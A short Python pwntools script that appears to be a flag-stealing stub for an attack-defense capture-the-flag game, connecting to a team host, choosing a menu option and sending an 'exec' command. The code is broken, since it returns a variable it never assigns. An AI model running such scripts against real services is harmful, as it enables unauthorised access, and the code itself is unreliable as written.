import logging
from pwn import *
from random import randint
import sys
 
logging.basicConfig(level=logging.DEBUG)

def get_flag(host, port, flag_id, token):
    c = remote(host,port)
    print(c.recvline())
    print(c.recvline())
    print(c.recvline())
    print(c.recvline())
    print(c.sendline("2"))
    print(c.recvuntil(' ',drop=True))
    c.sendline("exec\n")
    print(c.recvline())
    print(data)
    c.close()
    return data


get_flag('team11',10001,'2','token')
